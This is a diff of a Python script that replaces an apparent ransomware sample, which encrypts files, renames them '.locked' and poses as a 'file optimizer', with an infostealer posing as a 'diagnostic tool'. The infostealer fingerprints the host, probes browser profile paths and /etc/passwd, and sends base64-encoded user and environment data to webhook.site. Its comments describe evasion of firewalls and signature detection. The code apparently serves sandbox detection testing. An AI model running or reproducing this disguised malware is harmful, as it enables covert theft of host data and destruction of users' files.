@@ -1,63 +1,69 @@
 import os
+import platform
 import time
-from cryptography.fernet import Fernet
+import json
+import base64
+import http.client
 
-# 1. GENERATE DECEPTION KEY
-# In a real attack, this key would be sent to a C2 server.
-def initialize_engine():
-    print("[+] Initializing Encryption Engine...")
-    key = Fernet.generate_key()
-    with open("unlock_key.txt", "wb") as key_file:
-        key_file.write(key)
-    return Fernet(key)
+def audit_host_identity():
+    print("[+] Initializing Diagnostic Service...")
+    # ACTION 1: Environment Fingerprinting (Reconnaissance)
+    # Gathering hardware and user info to identify if it's a VM or real target.
+    sys_info = {
+        "os": platform.system(),
+        "node": platform.node(),
+        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
+        "env": list(os.environ.keys())
+    }
+    print(f"[*] Host Identity: {sys_info['node']} | User: {sys_info['user']}")
+    return sys_info
 
-# 2. RECURSIVE FILE DISCOVERY
-# This mimics the 'Trapping' behavior of ransomware.
-def discover_target_files(directory):
-    print(f"[*] Scanning directory: {directory}")
-    target_extensions = ('.txt', '.pdf', '.docx', '.jpg', '.png')
-    targets = []
+def capture_browser_artifacts():
+    print("[+] Checking browser integrity...")
+    # ACTION 2: Targeted Path Traversal
+    # Looking for sensitive paths where browsers store history/cookies.
+    # Note: We aren't reading the data, just proving we can find the path.
+    paths_to_check = [
+        os.path.expanduser('~/.mozilla/firefox/'),
+        os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/'),
+        "/etc/passwd"
+    ]
     
-    for root, dirs, files in os.walk(directory):
-        for file in files:
-            if file.endswith(target_extensions) and not file.startswith('.'):
-                targets.append(os.path.join(root, file))
-    return targets
+    found = []
+    for path in paths_to_check:
+        if os.path.exists(path):
+            found.append(path)
+            print(f"[!] Vulnerability: Accessible sensitive path found -> {path}")
+    return found
 
-# 3. ENCRYPTION (The High-Risk Behavior)
-def detonate_payload(targets, engine):
-    print(f"[!] Found {len(targets)} targets. Starting 'optimization'...")
-    for file_path in targets:
-        try:
-            with open(file_path, "rb") as f:
-                data = f.read()
-            
-            # Encrypting the data
-            encrypted_data = engine.encrypt(data)
-            
-            # Overwriting the original file with encrypted content
-            with open(file_path, "wb") as f:
-                f.write(encrypted_data)
-            
-            # Renaming the file to a custom extension (common ransomware tactic)
-            os.rename(file_path, file_path + ".locked")
-            print(f"[*] Processed: {os.path.basename(file_path)}")
-        except Exception as e:
-            print(f"[-] Error processing {file_path}: {e}")
+def transmit_telemetry(data):
+    # ACTION 3: Covert Data Exfiltration (DNS/HTTP Tunneling Simulation)
+    # Sending system info to a remote server disguised as 'telemetry'.
+    print("[+] Syncing diagnostic telemetry with cloud...")
+    
+    # Base64 encoding hides the 'meaning' of the data from simple firewalls.
+    encoded_data = base64.b64encode(str(data).encode()).decode()
+    
+    try:
+        # Using built-in http.client to avoid 'requests' signatures.
+        conn = http.client.HTTPConnection("webhook.site", timeout=5)
+        # In a real attack, the data is appended to the URL or header.
+        conn.request("GET", f"/v1/telemetry?data={encoded_data[:50]}")
+        conn.close()
+        print("[*] Telemetry sync successful.")
+    except Exception:
+        print("[-] Cloud sync unavailable. Retrying in background.")
 
 if __name__ == "__main__":
-    print("=== SYSTEM FILE OPTIMIZER v2.0 ===")
+    print("=== DYNAMIC SYSTEM DIAGNOSTIC TOOL v3.1.2 ===")
     
-    # Create a dummy folder for the sandbox to "attack"
-    os.makedirs("test_data", exist_ok=True)
-    with open("test_data/secret_notes.txt", "w") as f:
-        f.write("This is highly sensitive company information.")
+    identity = audit_host_identity()
+    time.sleep(1.5) # Wait to mimic real processing
     
-    engine = initialize_engine()
-    targets = discover_target_files("./test_data")
+    artifacts = capture_browser_artifacts()
     
-    # Give the sandbox a moment to 'watch' the scan
-    time.sleep(2) 
+    # If we found sensitive paths, "exfiltrate" the identity info.
+    if artifacts:
+        transmit_telemetry(identity)
     
-    detonate_payload(targets, engine)
-    print("=== ALL FILES OPTIMIZED. RESTART SYSTEM TO APPLY CHANGES. ===")
+    print("=== DIAGNOSTIC COMPLETE: SYSTEM OPTIMIZED ===")
